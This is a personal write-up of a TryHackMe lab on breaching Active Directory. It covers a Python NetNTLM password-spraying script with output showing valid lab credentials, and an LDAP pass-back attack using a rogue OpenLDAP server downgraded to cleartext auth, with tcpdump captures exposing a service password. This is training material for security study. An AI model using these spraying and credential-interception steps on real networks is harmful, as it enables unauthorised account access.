# Introduction to AD Breaches

---

Active Directory (AD) is used by approximately 90% of the Global Fortune 1000 companies. If an organisation's estate uses Microsoft Windows, you are almost guaranteed to find AD. Microsoft AD is the dominant suite used to manage Windows domain networks. However, since AD is used for Identity and Access Management of the entire estate, it holds the keys to the kingdom, making it a very likely target for attackers.

For a more in-depth understanding of AD and how it works, [please complete this room on AD basics first.](https://tryhackme.com/jr/winadbasics)

Breaching Active Directory 

Before we can exploit AD misconfigurations for privilege escalation, lateral movement, and goal execution, you need initial access first. You need to acquire an initial set of valid AD credentials. Due to the number of AD services and features, the attack surface for gaining an initial set of AD credentials is usually significant. In this room, we will discuss several avenues, but this is by no means an exhaustive list.

When looking for that first set of credentials, we don't focus on the permissions associated with the account; thus, even a low-privileged account would be sufficient. We are just looking for a way to authenticate to AD, allowing us to do further enumeration on AD itself.

## Learning Objectives 

In this network, we will cover several methods that can be used to breach AD. This is by no means a complete list as new methods and techniques are discovered every day. However, we will cover the following techniques to recover AD credentials in this network:

- NTLM Authenticated Services
- LDAP Bind Credentials
- Authentication Relays
- Microsoft Deployment Toolkit
- Configuration Files 

We can use these techniques on a security assessment either by targeting systems of an organisation that are internet-facing or by implanting a rogue device on the organisation's network.

## Connecting to the Network 

**AttackBox** 

If you are using the Web-based AttackBox, you will be connected to the network automatically if you start the AttackBox from the room's page. You can verify this by running the ping command against the IP of the THMDC.za.tryhackme.com host. We do still need to configure DNS, however. Windows Networks use the Domain Name Service (DNS) to resolve hostnames to IPs. Throughout this network, DNS will be used for the tasks. You will have to configure DNS on the host on which you are running the VPN connection. In order to configure our DNS, run the following command:


```shell-session
[thm@thm]$ sed -i '1s|^|nameserver $THMDCIP\n|' /etc/resolv-dnsmasq
```

Remember to replace $THMDCIP with the IP of THMDC in your network diagram. You can test that DNS is working by running:

`nslookup thmdc.za.tryhackme.com`

This should resolve to the IP of your DC.

**Note: DNS may be reset on the AttackBox roughly every 3 hours. If this occurs, you will have to rerun the command specified above. If your AttackBox terminates and you continue with the room at a later stage, you will have to redo all the DNS steps.** 

You should also take the time to make note of your VPN IP. Using`ifconfig` or`ip a`, make note of the IP of the **breachad** network adapter. This is your IP and the associated interface that you should use when performing the attacks in the tasks. 

**Other Hosts** 

If you are going to use your own attack machine, an OpenVPN configuration file will have been generated for you once you join the room. Go to your [access](https://tryhackme.com/access) page. Select 'BreachingAD' from the VPN servers (under the network tab) and download your configuration file.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6b702e582752df080ce88d2e3dd156f9.png) 

Use an OpenVPN client to connect. This example is shown on a Linux machine; similar guides to connect using Windows or macOS can be found at your [access](https://tryhackme.com/access) page.


```shell-session
[thm@thm]$ sudo openvpn breachingad.ovpn
Fri Mar 11 15:06:20 2022 OpenVPN 2.4.9 x86_64-redhat-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Apr 19 2020
Fri Mar 11 15:06:20 2022 library versions: OpenSSL 1.1.1g FIPS 21 Apr 2020, LZO 2.08
[....]
Fri Mar 11 15:06:22 2022 /sbin/ip link set dev tun0 up mtu 1500
Fri Mar 11 15:06:22 2022 /sbin/ip addr add dev tun0 10.50.2.3/24 broadcast 10.50.2.255
Fri Mar 11 15:06:22 2022 /sbin/ip route add 10.200.4.0/24 metric 1000 via 10.50.2.1
Fri Mar 11 15:06:22 2022 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
Fri Mar 11 15:06:22 2022 Initialization Sequence Completed
```

The message "Initialization Sequence Completed" tells you that you are now connected to the network. Return to your access page. You can verify you are connected by looking on your access page. Refresh the page, and you should see a green tick next to Connected. It will also show you your internal IP address.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/9c4062cd1d04330188ff5d942e805e11.png) 

**Note:** You still have to configure DNS similar to what was shown above. It is important to note that although not used, the DC does log DNS requests. If you are using your own machine, these logs may include the hostname of your device. For example, if you run the VPN on your kali machine with the hostname of kali, this will be logged.

**Kali**

If you are using a Kali VM, Network Manager is most likely used as DNS manager. You can use GUI Menu to configure DNS:

- Network Manager -> Advanced Network Configuration -> Your Connection -> IPv4 Settings
- Set your DNS IP here to the IP for THMDC in the network diagram above 
- Add another DNS such as 1.1.1.1 or similar to ensure you still have internet access
- Run`sudo systemctl restart NetworkManager` and test your DNS similar to the steps above.

Debugging DNS

DNS will be a part of Active Directory testing whether you like it or not. This is because one of the two major AD authentication protocols, Kerberos, relies on DNS to create tickets. Tickets cannot be associated with IPs, so DNS is a must. If you are going to test AD networks on a security assessment, you will have to equip yourself with the skills required to solve DNS issues. Therefore, you usually have two options:

- You can hardcode DNS entries into your`/etc/hosts` file. While this may work well, it is infeasible when you will be testing networks that have more than 10000 hosts.
- You can spend the time required to debug the DNS issue to get it working. While this may be harder, in the long run, it will yield you better results.

Whenever one of the tasks within this room is not working for you, your first thought should be: _Is my DNS working?_ From experience, I, the creator of this network, can tell you that I've wasted countless hours on assessments wondering why my tooling is not working, only to realise that my DNS has changed. 

Whenever you think that your DNS configuration might not be working as it should, follow these steps to do some debugging:

1. Follow the steps provided above. Make sure to follow the steps for your specific machine type.- If you use a completely different OS, you will have to do some googling to find your equivalent configuration. 
2. Run`ping <THM DC IP>` - This will verify that the network is active. If you do not get a response from the ping, it means that the network is not currently active. If your network says that it is running after you have refreshed the room page and you still get no ping response, contact THM support but simply waiting for the network timer to run out before starting the network again will fix the issue.
3. Run`nslookup za.tryhackme.com <THM DC IP>` - This will verify that the DNS server within the network is active, as the domain controller has this functional role. If the ping command worked but this does not, time to contact support since there is something wrong. It is also suggested to hit the network reset button.
4. Finally, run`nslookup tryhackme.com` - If you now get a different response than the one in step three, it means there is something wrong with your DNS configuration. Go back to the configuration steps at the start of the task and follow them again. A common issue seen on Kali is that the DNS entry is placed as the second one in your`/etc/resolv.conf` file. By making it the first entry, it will resolve the issue.

These AD networks are rated medium, which means if you just joined THM, this is probably not where you should start your learning journey. AD is massive and you will need to apply the mindset of _figuring stuff_ _out_ if you want to make a success of testing it. However, if all of the above still fails, please be as descriptive as possible on what you are trying to do when you contact support, to allow them to help you as efficiently as possible.


# OSINT and Phishing

----

Two popular methods for gaining access to that first set of AD credentials is Open Source Intelligence (OSINT) and Phishing. We will only briefly mention the two methods here, as they are already covered more in-depth in other rooms. 

**OSINT**

OSINT is used to discover information that has been publicly disclosed. In terms of AD credentials, this can happen for several reasons, such as:

- Users who ask questions on public forums such as [Stack Overflow](https://stackoverflow.com/) but disclose sensitive information such as their credentials in the question.
- Developers that upload scripts to services such as [Github](https://github.com/) with credentials hardcoded.
- Credentials being disclosed in past breaches since employees used their work accounts to sign up for other external websites. Websites such as [HaveIBeenPwned](https://haveibeenpwned.com/) and [DeHashed](https://www.dehashed.com/) provide excellent platforms to determine if someone's information, such as work email, was ever involved in a publicly known data breach. 



![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/aff4d16d5f4905d8e323c76397ed78fe.png)

By using OSINT techniques, it may be possible to recover publicly disclosed credentials. If we are lucky enough to find credentials, we will still need to find a way to test whether they are valid or not since OSINT information can be outdated. In Task 3, we will talk about NTLM Authenticated Services, which may provide an excellent avenue to test credentials to see if they are still valid.

A detailed room on Red Team OSINT can be found [here.](https://tryhackme.com/jr/redteamrecon)

**Phishing**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8aaed661dc298a6ee9257e1edbd0df97.png)

Phishing is another excellent method to breach AD. Phishing usually entices users to either provide their credentials on a malicious web page or ask them to run a specific application that would install a Remote Access Trojan (RAT) in the background. This is a prevalent method since the RAT would execute in the user's context, immediately allowing you to impersonate that user's AD account. This is why phishing is such a big topic for both Red and Blue teams.

A detailed room on phishing can be found [here.](https://tryhackme.com/module/phishing)

![Pasted image 20250526123341.png](../../../IMAGES/Pasted%20image%2020250526123341.png)


# NTLM Authenticated Services

---

## NTLM and NetNTLM 

New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users' identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM. This authentication mechanism is heavily used by the services on a network. However, services that use NetNTLM can also be exposed to the internet. The following are some of the popular examples:

- Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
- Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
- Exposed VPN endpoints that were integrated with AD.
- Web applications that are internet-facing and make use of NetNTLM. 
 

NetNTLM, also often referred to as Windows Authentication or just NTLM Authentication, allows the application to play the role of a middle man between the client and AD. All authentication material is forwarded to a Domain Controller in the form of a challenge, and if completed successfully, the application will authenticate the user.

This means that the application is authenticating on behalf of the user and not authenticating the user directly on the application itself. This prevents the application from storing AD credentials, which should only be stored on a Domain Controller. This process is shown in the diagram below:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c9113ad0ff443dd0973736552e85aa69.png) 

## Brute-force Login Attacks 

As mentioned in Task 2, these exposed services provide an excellent location to test credentials discovered using other means. However, these services can also be used directly in an attempt to recover an initial set of valid AD credentials. We could perhaps try to use these for brute force attacks if we recovered information such as valid email addresses during our initial red team recon.

Since most AD environments have account lockout configured, we won't be able to run a full brute-force attack. Instead, we need to perform a password spraying attack. Instead of trying multiple different passwords, which may trigger the account lockout mechanism, we choose and use one password and attempt to authenticate with all the usernames we have acquired. However, it should be noted that these types of attacks can be detected due to the amount of failed authentication attempts they will generate. 

You have been provided with a list of usernames discovered during a red team OSINT exercise. The OSINT exercise also indicated the organisation's initial onboarding password, which seems to be "Changeme123". Although users should always change their initial password, we know that users often forget. We will be using a custom-developed script to stage a password spraying against the web application hosted at this URL: [http://ntlmauth.za.tryhackme.com](http://ntlmauth.za.tryhackme.com/).

Navigating to the URL, we can see that it prompts us for Windows Authentication credentials:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5f18e5326d5a50d656d1827221bdcac7.png)

**Note:** _Firefox's Windows Authentication plugin is incredibly prone to failure. If you want to test credentials manually, Chrome is recommended._

We could use tools such as [Hydra](https://github.com/vanhauser-thc/thc-hydra) to assist with the password spraying attack. However, it is often better to script up these types of attacks yourself, which allows you more control over the process. A base python script has been provided in the task files that can be used for the password spraying attack. The following function is the main component of the script:

```python
def password_spray(self, password, url):
 print ("[*] Starting passwords spray attack using the following password: " + password)
 #Reset valid credential counter
 count = 0
 #Iterate through all of the possible usernames
 for user in self.users:
 #Make a request to the website and attempt Windows Authentication
 response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
 #Read status code of response to determine if authentication was successful
 if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
 print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
 count += 1
 continue
 if (self.verbose):
 if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
 print ("[-] Failed login with Username: " + user)
 print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

This function takes our suggested password and the URL that we are targeting as input and attempts to authenticate to the URL with each username in the textfile. By monitoring the differences in HTTP response codes from the application, we can determine if the credential pair is valid or not. If the credential pair is valid, the application would respond with a 200 HTTP (OK) code. If the pair is invalid, the application will return a 401 HTTP (Unauthorised) code.

## Password Spraying 

If you are using the AttackBox, the password spraying script and usernames textfile is provided under the`/root/Rooms/BreachingAD/task3/` directory. We can run the script using the following command:

```
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
```

We provide the following values for each of the parameters:

- `<userfile>` - Textfile containing our usernames - _"usernames.txt"_
- `<fqdn>` - Fully qualified domain name associated with the organisation that we are attacking - _"za.tryhackme.com"_
- `password` - The password we want to use for our spraying attack
- _"Changeme123"_
- `<attackurl>` - The URL of the application that supports Windows Authentication - _"http://ntlmauth.za.tryhackme.com"_

Using these parameters, we should get a few valid credentials pairs from our password spraying attack.


```shell-session
[thm@thm]$ python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: henry.taylor
[...]
[+] Valid credential pair found! Username: [...] Password: Changeme123
[-] Failed login with Username: louise.talbot
[...]
[*] Password spray attack completed, [X] valid credential pairs found
```

Using a combination of OSINT and NetNTLM password spraying, we now have our first valid credentials pairs that could be used to enumerate AD further!


## Practical

---

If we brute force:

```python
kali@kali:~/AD$ python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
[*] Starting passwords spray attack using the following password: Changeme123
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
 arc4 = algorithms.ARC4(self._key)
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: samantha.thompson
[-] Failed login with Username: dawn.turner
[-] Failed login with Username: frances.chapman
[-] Failed login with Username: henry.taylor
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[-] Failed login with Username: louise.talbot
[+] Valid credential pair found! Username: heather.smith Password: Changeme123 
[-] Failed login with Username: dominic.elliott
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[-] Failed login with Username: alan.jones
[-] Failed login with Username: frank.fletcher
[-] Failed login with Username: maria.sheppard 
[-] Failed login with Username: sophie.blackburn 
[-] Failed login with Username: dawn.hughes 
[-] Failed login with Username: henry.black 
[-] Failed login with Username: joanne.davies 
[-] Failed login with Username: mark.oconnor 
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123 
[*] Password spray attack completed, 4 valid credential pairs found

```

Now, if we login with any credentials:

![Pasted image 20250526130951.png](../../../IMAGES/Pasted%20image%2020250526130951.png)

We got our answers:

![Pasted image 20250526131002.png](../../../IMAGES/Pasted%20image%2020250526131002.png)


 
# LDAP Bind Credentials

---

## LDAP 

Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication is similar to NTLM authentication. However, with LDAP authentication, the application directly verifies the user's credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user's credentials.

LDAP authentication is a popular mechanism with third-party (non-Microsoft) applications that integrate with AD. These include applications and systems such as:

- Gitlab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs 

If any of these applications or services are exposed on the internet, the same type of attacks as those leveraged against NTLM authenticated systems can be used. However, since a service using LDAP authentication requires a set of AD credentials, it opens up additional attack avenues. In essence, we can attempt to recover the AD credentials used by the service to gain authenticated access to AD. The process of authentication through LDAP is shown below:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png) 

If you could gain a foothold on the correct host, such as a Gitlab server, it might be as simple as reading the configuration files to recover these AD credentials. These credentials are often stored in plain text in configuration files since the security model relies on keeping the location and storage configuration file secure rather than its contents. Configuration files are covered in more depth in Task 7.

## LDAP Pass-back Attacks 

However, one other very interesting attack can be performed against LDAP authentication mechanisms, called an LDAP Pass-back attack. This is a common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom.

LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Usually, the credentials for these interfaces are kept to the default ones, such as`admin:admin` or`admin:password`. Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

## Performing an LDAP Pass-back 

There is a network printer in this network where the administration website does not even require credentials. Navigate to [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx) to find the settings page of the printer:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b2ab520a2601299ed9bf74d50168ca7d.png)

Using browser inspection, we can also verify that the printer website was at least secure enough to not just send the LDAP password back to the browser:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c7cfe0419d3ebe9534d4caefcd1a5511.png) 

So we have the username, but not the password. However, when we press test settings, we can see that an authentication request is made to the domain controller to test the LDAP credentials. Let's try to exploit this to get the printer to connect to us instead, which would disclose the credentials. To do this, let's use a simple Netcat listener to test if we can get the printer to connect to us. Since the default port of LDAP is 389, we can use the following command:

```
nc -lvp 389
```

Note that if you use the AttackBox, the you should first disable slapd using`service slapd stop`. Then, we can alter the Server input box on the web application to point to our IP and press Test Settings.

**Your IP will be your VPN IP and will either be a 10.50.x.x IP or 10.51.x.x IP. You can use**`ip a` **to list all interfaces. Please make sure to use this as your IP, otherwise you will not receive a connection back. Please also make note of the interface for this IP, since you will need it later in the task.**

You should see that we get a connection back, but there is a slight problem:


```shell-session
[thm@thm]$ nc -lvp 389
listening on [any] 389 ...
10.10.10.201: inverse host lookup failed: Unknown host
connect to [10.10.10.55] from (UNKNOWN) [10.10.10.201] 49765
0?DC?;
?
?x
 objectclass0?supportedCapabilities
 
```

You may require more than one try to receive a connection back but it should respond within 5 seconds. The`supportedCapabilities` response tells us we have a problem. Essentially, before the printer sends over the credentials, it is trying to negotiate the LDAP authentication method details. It will use this negotiation to select the most secure authentication method that both the printer and the LDAP server support. If the authentication method is too secure, the credentials will not be transmitted in cleartext. With some authentication methods, the credentials will not be transmitted over the network at all! So we can't just use normal Netcat to harvest the credentials. We will need to create a rogue LDAP server and configure it insecurely to ensure the credentials are sent in plaintext.

## Hosting a Rogue LDAP Server 

There are several ways to host a rogue LDAP server, but we will use OpenLDAP for this example. If you are using the AttackBox, OpenLDAP has already been installed for you. However, if you are using your own attack machine, you will need to install OpenLDAP using the following command:

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

You will however have to configure your own rogue LDAP server on the AttackBox as well. We will start by reconfiguring the LDAP server using the following command:

```
sudo dpkg-reconfigure -p low slapd
```

Make sure to press `<No>` when requested if you want to skip server configuration:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/97afd26fd4f6d10a2a86ab65ac401845.png) 

For the DNS domain name, you want to provide our target domain, which is`za.tryhackme.com`:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/01b0d4256900cbf48d8d082d8bdf14bb.png) 

Use this same name for the Organisation name as well: 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c4bef0c3f054c32ca982ee9c1608ba1b.png) 

Provide any Administrator password:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/23b957d41ddba8060e4bc2295b56a2fb.png)

Select MDB as the LDAP database to use:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/07af572567aa32e0e0be2b4d9f54b89a.png)

For the last two options, ensure the database is not removed when purged:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4d5086da7b25a6f218d6eebdab6d3b71.png) 

Move old database files before a new one is created:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d383582606e776eb901650ac9799cef5.png) 

Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. To do this, we need to create a new ldif file, called with the following content:

olcSaslSecProps.ldif

```shell-session
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

The file has the following properties:

- **olcSaslSecProps:** Specifies the SASL security properties
- **noanonymous:** Disables mechanisms that support anonymous login
- **minssf:** Specifies the minimum acceptable security strength with 0, meaning no protection.

Now we can use the ldif file to patch our LDAP server using the following:

```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

We can verify that our rogue LDAP server's configuration has been applied using the following command (**Note**: If you are using Kali, you may not receive any output, however the configuration should have worked and you can continue with the next steps):

LDAP search to verify supported authentication mechanisms

```shell-session
[thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

## Capturing LDAP Credentials 

Our rogue LDAP server has now been configured. When we click the "Test Settings" at [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx), the authentication will occur in clear text. If you configured your rogue LDAP server correctly and it is downgrading the communication, you will receive the following error: "This distinguished name contains invalid syntax". If you receive this error, you can use a tcpdump to capture the credentials using the following command:

TCPDump

```shell-session
[thm@thm]$ sudo tcpdump -SX -i breachad tcp port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10:41:52.979933 IP 10.10.10.201.49834 > 10.10.10.57.ldap: Flags [P.], seq 4245946075:4245946151, ack 1113052386, win 8212, length 76
	0x0000: 4500 0074 b08c 4000 8006 20e2 0a0a 0ac9 E..t..@.........
	0x0010: 0a0a 0a39 c2aa 0185 fd13 fedb 4257 d4e2 ...9........BW..
	0x0020: 5018 2014 1382 0000 3084 0000 0046 0201 P.......0....F..
	0x0030: 0263 8400 0000 3d04 000a 0100 0a01 0002 .c....=.........
	0x0040: 0100 0201 7801 0100 870b 6f62 6a65 6374 ....x.....object
	0x0050: 636c 6173 7330 8400 0000 1904 1773 7570 class0.......sup
	0x0060: 706f 7274 6564 5341 534c 4d65 6368 616e portedSASLMechan
	0x0070: 6973 6d73 isms
10:41:52.979938 IP 10.10.10.57.ldap > 10.10.10.201.49834: Flags [.], ack 4245946151, win 502, length 0
	0x0000: 4500 0028 247d 4000 4006 ed3d 0a0a 0a39 E..($}@.@..=...9
	0x0010: 0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27 ........BW.....'
	0x0020: 5010 01f6 2930 0000 P...)0..
10:41:52.980162 IP 10.10.10.57.ldap > 10.10.10.201.49834: Flags [P.], seq 1113052386:1113052440, ack 4245946151, win 502, length 54
	0x0000: 4500 005e 247e 4000 4006 ed06 0a0a 0a39 E..^$~@.@......9
	0x0010: 0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27 ........BW.....'
	0x0020: 5018 01f6 2966 0000 3034 0201 0264 2f04 P...)f..04...d/.
	0x0030: 0030 2b30 2904 1773 7570 706f 7274 6564 .0+0)..supported
	0x0040: 5341 534c 4d65 6368 616e 6973 6d73 310e SASLMechanisms1.
	0x0050: 0405 504c 4149 4e04 054c 4f47 494e ..PLAIN..LOGIN
[....]
10:41:52.987145 IP 10.10.10.201.49835 > 10.10.10.57.ldap: Flags [.], ack 3088612909, win 8212, length 0
	0x0000: 4500 0028 b092 4000 8006 2128 0a0a 0ac9 E..(..@...!(....
	0x0010: 0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d ...9.......J..~-
	0x0020: 5010 2014 0ae4 0000 0000 0000 0000 P.............
10:41:52.989165 IP 10.10.10.201.49835 > 10.10.10.57.ldap: Flags [P.], seq 2332415562:2332415627, ack 3088612909, win 8212, length 65
	0x0000: 4500 0069 b093 4000 8006 20e6 0a0a 0ac9 E..i..@.........
	0x0010: 0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d ...9.......J..~-
	0x0020: 5018 2014 3afe 0000 3084 0000 003b 0201 P...:...0....;..
	0x0030: 0560 8400 0000 3202 0102 0418 7a61 2e74 .`....2.....za.t
	0x0040: 7279 6861 636b 6d65 2e63 6f6d 5c73 7663 ryhackme.com\svc
	0x0050: 4c44 4150 8013 7472 7968 6163 6b6d 656c LDAP..password11
```

Also, note that`password11` is an example. The password for your service will be different. You may have to press the "Test Settings" button a couple of times before the TCPdump will return data since we are performing the attack over a VPN connection. 

Now we have another set of valid AD credentials! By using an LDAP pass-back attack and downgrading the supported authentication mechanism, we could intercept the credentials in cleartext.


## Practical

---

We need to follow all steps mentioned on the walkthrough, once we do it, we get this using `tcpdump`:

```
sudo tcpdump -SX -i breachad tcp port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes
14:31:52.537737 IP 10.200.27.201.54281 > kali.ldap: Flags [SEW], seq 2541225444, win 64240, options [mss 1289,nop,wscale 8,nop,nop,sackOK], length 0
 0x0000: 4502 0034 9401 4000 7f06 1dc9 0ac8 1bc9 E..4..@.........
 0x0010: 0a32 1935 d409 0185 9778 05e4 0000 0000 .2.5.....x......
 0x0020: 80c2 faf0 b727 0000 0204 0509 0103 0308 .....'..........
 0x0030: 0101 0402 ....
14:31:52.537760 IP kali.ldap > 10.200.27.201.54281: Flags [S.], seq 1330635360, ack 2541225445, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
 0x0000: 4500 0034 0000 4000 4006 f0cc 0a32 1935 E..4..@.@....2.5
 0x0010: 0ac8 1bc9 0185 d409 4f4f e260 9778 05e5 ........OO.`.x..
 0x0020: 8012 faf0 857c 0000 0204 05b4 0101 0402 .....|..........
 0x0030: 0103 0307 ....
14:31:52.729237 IP 10.200.27.201.54281 > kali.ldap: Flags [.], ack 1330635361, win 1027, length 0
 0x0000: 4500 0028 9403 4000 7f06 1dd5 0ac8 1bc9 E..(..@.........
 0x0010: 0a32 1935 d409 0185 9778 05e5 4f4f e261 .2.5.....x..OO.a
 0x0020: 5010 0403 bd3c 0000 P....<..
14:31:52.729503 IP 10.200.27.201.54281 > kali.ldap: Flags [P.], seq 2541225445:2541225519, ack 1330635361, win 1027, length 74
 0x0000: 4500 0072 9404 4000 7f06 1d8a 0ac8 1bc9 E..r..@.........
 0x0010: 0a32 1935 d409 0185 9778 05e5 4f4f e261 .2.5.....x..OO.a
 0x0020: 5018 0403 75af 0000 3084 0000 0044 0201 P...u...0....D..
 0x0030: 0763 8400 0000 3b04 000a 0100 0a01 0002 .c....;.........
 0x0040: 0100 0201 7801 0100 870b 6f62 6a65 6374 ....x.....object
 0x0050: 636c 6173 7330 8400 0000 1704 1573 7570 class0.......sup
 0x0060: 706f 7274 6564 4361 7061 6269 6c69 7469 portedCapabiliti
 0x0070: 6573 es
14:31:52.729513 IP kali.ldap > 10.200.27.201.54281: Flags [.], ack 2541225519, win 502, length 0
 0x0000: 4500 0028 93f1 4000 4006 5ce7 0a32 1935 E..(..@.@.\..2.5
 0x0010: 0ac8 1bc9 0185 d409 4f4f e261 9778 062f ........OO.a.x./
 0x0020: 5010 01f6 beff 0000 P.......
14:31:52.729722 IP kali.ldap > 10.200.27.201.54281: Flags [P.], seq 1330635361:1330635372, ack 2541225519, win 502, length 11
 0x0000: 4500 0033 93f2 4000 4006 5cdb 0a32 1935 E..3..@.@.\..2.5
 0x0010: 0ac8 1bc9 0185 d409 4f4f e261 9778 062f ........OO.a.x./
 0x0020: 5018 01f6 814a 0000 3009 0201 0764 0404 P....J..0....d..
 0x0030: 0030 00 .0.
14:31:52.729802 IP kali.ldap > 10.200.27.201.54281: Flags [P.], seq 1330635372:1330635386, ack 2541225519, win 502, length 14
 0x0000: 4500 0036 93f3 4000 4006 5cd7 0a32 1935 E..6..@.@.\..2.5
 0x0010: 0ac8 1bc9 0185 d409 4f4f e26c 9778 062f ........OO.l.x./
 0x0020: 5018 01f6 7562 0000 300c 0201 0765 070a P...ub..0....e..
 0x0030: 0100 0400 0400 ......
14:31:52.921285 IP 10.200.27.201.54281 > kali.ldap: Flags [.], ack 1330635386, win 1027, length 0
 0x0000: 4500 0028 9405 4000 7f06 1dd3 0ac8 1bc9 E..(..@.........
 0x0010: 0a32 1935 d409 0185 9778 062f 4f4f e27a .2.5.....x./OO.z
 0x0020: 5010 0403 bcd9 0000 P.......
14:31:52.921450 IP 10.200.27.201.54281 > kali.ldap: Flags [P.], seq 2541225519:2541225595, ack 1330635386, win 1027, length 76
 0x0000: 4500 0074 9406 4000 7f06 1d86 0ac8 1bc9 E..t..@.........
 0x0010: 0a32 1935 d409 0185 9778 062f 4f4f e27a .2.5.....x./OO.z
 0x0020: 5018 0403 3b0a 0000 3084 0000 0046 0201 P...;...0....F..
 0x0030: 0863 8400 0000 3d04 000a 0100 0a01 0002 .c....=.........
 0x0040: 0100 0201 7801 0100 870b 6f62 6a65 6374 ....x.....object
 0x0050: 636c 6173 7330 8400 0000 1904 1773 7570 class0.......sup
 0x0060: 706f 7274 6564 5341 534c 4d65 6368 616e portedSASLMechan
 0x0070: 6973 6d73 isms
14:31:52.921736 IP kali.ldap > 10.200.27.201.54281: Flags [P.], seq 1330635386:1330635440, ack 2541225595, win 502, length 54
 0x0000: 4500 005e 93f4 4000 4006 5cae 0a32 1935 E..^..@.@.\..2.5
 0x0010: 0ac8 1bc9 0185 d409 4f4f e27a 9778 067b ........OO.z.x.{
 0x0020: 5018 01f6 e9ee 0000 3034 0201 0864 2f04 P.......04...d/.
 0x0030: 0030 2b30 2904 1773 7570 706f 7274 6564 .0+0)..supported
 0x0040: 5341 534c 4d65 6368 616e 6973 6d73 310e SASLMechanisms1.
 0x0050: 0405 4c4f 4749 4e04 0550 4c41 494e ..LOGIN..PLAIN
14:31:52.921760 IP kali.ldap > 10.200.27.201.54281: Flags [P.], seq 1330635440:1330635454, ack 2541225595, win 502, length 14
